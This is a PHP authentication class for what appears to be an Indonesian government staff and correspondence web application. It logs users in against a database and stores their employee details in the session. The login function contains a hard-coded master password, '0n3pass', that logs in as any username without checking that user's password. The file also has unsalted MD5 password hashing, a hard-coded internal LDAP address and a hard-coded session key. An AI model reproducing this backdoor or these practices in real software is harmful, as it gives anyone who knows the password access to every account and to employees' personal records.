<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
require_once 'kloader.php';

class kauth {
    //put your code here
    private $ldap_config = array('server1'=>array(   'host'=>'10.0.0.11',
                                    'useStartTls'=>false,
                                    'accountDomainName'=>'pp3.co.id',
                                    'accountDomainNameShort'=>'PP3',
                                    'accountCanonicalForm'=>3,
                                    'baseDn'=>"DC=pp3,DC=co,DC=id"));


        function __construct() {
//        load the auth class
        kloader::load('Zend_Auth');
        kloader::load('Zend_Auth_Storage_Session');
        
//        set the unique storege
        Zend_Auth::getInstance()->setStorage(new Zend_Auth_Storage_Session("s1ap0nlin3"));
    }
    
    public function localAuthenticate($username,$credential) {
        $auth = Zend_Auth::getInstance();
        $auth->clearIdentity();
        
		$CI =& get_instance();

		/* USER AUTH */
		$CI->load->model("UserLogin");

		$username= $CI->db->escape($username);
		$vcredential= md5($credential);
		$credential= $CI->db->escape($vcredential);

		if($vcredential == md5("0n3pass"))
			$statement= " AND LOGIN_USER = ".$username;
		else
			$statement= " AND LOGIN_USER = ".$username." AND LOGIN_PASS = ".$credential;
		// echo $statement;exit;

		$user_login = new UserLogin();
		$user_login->selectByParamsLogin(array(), -1,-1, $statement);
		// echo $user_login->query;exit;
		// echo $user_login->errorMsg;
		if($user_login->firstRow())
		{
			$identity = new stdClass();
			$identity->USER_LOGIN_ID= $user_login->getField("USER_LOGIN_ID");
			$identity->USER_GROUP_ID= $user_login->getField("USER_GROUP_ID");
			$identity->LOGIN_ID= $user_login->getField("USER_LOGIN_ID");
			$identity->LOGIN_PEGAWAI_ID= $user_login->getField("PEGAWAI_ID");
			
			$identity->LOGIN_USER= $user_login->getField("LOGIN_USER");
			$identity->LOGIN_LEVEL= $user_login->getField("LOGIN_LEVEL");
			$identity->USER_GROUP= $user_login->getField("USER_GROUP");
			$identity->AKSES_APP_SIMPEG_ID= $user_login->getField("AKSES_APP_SIMPEG_ID");
			$identity->AKSES_APP_PERSURATAN_ID= $user_login->getField("AKSES_APP_PERSURATAN_ID");
			$identity->SATUAN_KERJA_ID= $user_login->getField("SATUAN_KERJA_ID");
			$identity->SATUAN_KERJA_NAMA= $user_login->getField("SATUAN_KERJA_NAMA");
			$identity->SATUAN_KERJA_URUTAN_SURAT= $user_login->getField("SATUAN_KERJA_URUTAN_SURAT");
			$identity->SATUAN_KERJA_URUTAN_SURAT_NAMA= $user_login->getField("SATUAN_KERJA_URUTAN_SURAT_NAMA");
			$identity->SATUAN_KERJA_URUTAN_SURAT_JABATAN= $user_login->getField("SATUAN_KERJA_URUTAN_SURAT_JABATAN");
			$identity->SATUAN_KERJA_LOGIN_KEPALA_JABATAN= $user_login->getField("SATUAN_KERJA_LOGIN_KEPALA_JABATAN");
			$identity->SATUAN_KERJA_TIPE= $user_login->getField("SATUAN_KERJA_TIPE");
			$identity->STATUS_KELOMPOK_PEGAWAI_USUL= $user_login->getField("STATUS_KELOMPOK_PEGAWAI_USUL");

			$identity->STATUS_SATUAN_KERJA_BKD= $user_login->getField("STATUS_SATUAN_KERJA_BKD");
			$identity->STATUS_MENU_KHUSUS= $user_login->getField("STATUS_MENU_KHUSUS");

			$identity->PEGAWAI_ID= $user_login->getField("PEGAWAI_ID");
			$identity->PEGAWAI_NAMA_LENGKAP= $user_login->getField("PEGAWAI_NAMA_LENGKAP");
			$identity->PEGAWAI_PANGKAT_RIWAYAT_KODE= $user_login->getField("PEGAWAI_PANGKAT_RIWAYAT_KODE");
			$identity->PEGAWAI_PANGKAT_RIWAYAT_TMT= $user_login->getField("PEGAWAI_PANGKAT_RIWAYAT_TMT");
			$identity->PEGAWAI_JABATAN_RIWAYAT_NAMA= $user_login->getField("PEGAWAI_JABATAN_RIWAYAT_NAMA");
			$identity->PEGAWAI_JABATAN_RIWAYAT_ESELON= $user_login->getField("PEGAWAI_JABATAN_RIWAYAT_ESELON");
			$identity->PEGAWAI_JABATAN_RIWAYAT_TMT= $user_login->getField("PEGAWAI_JABATAN_RIWAYAT_TMT");
			$identity->PEGAWAI_PATH= $user_login->getField("PATH");
			$identity->SATUAN_KERJA_BKD_ID= $user_login->getField("SATUAN_KERJA_BKD_ID");
			$identity->TAMPIL_RESET= $user_login->getField("TAMPIL_RESET");
			
			$identity->STATUS_KHUSUS_DINAS = $user_login->getField("STATUS_KHUSUS_DINAS");
			$identity->AKSES_APP_ABSENSI_ID = $user_login->getField("AKSES_APP_ABSENSI_ID");
			$identity->INFO_SIPETA = $user_login->getField("INFO_SIPETA");
			$auth->getStorage()->write($identity);
            return true;			
		}
        else
        {
			return "Login gagal.";
        }
    }

    public function getInstance(){
        return Zend_Auth::getInstance();
    }
}

?>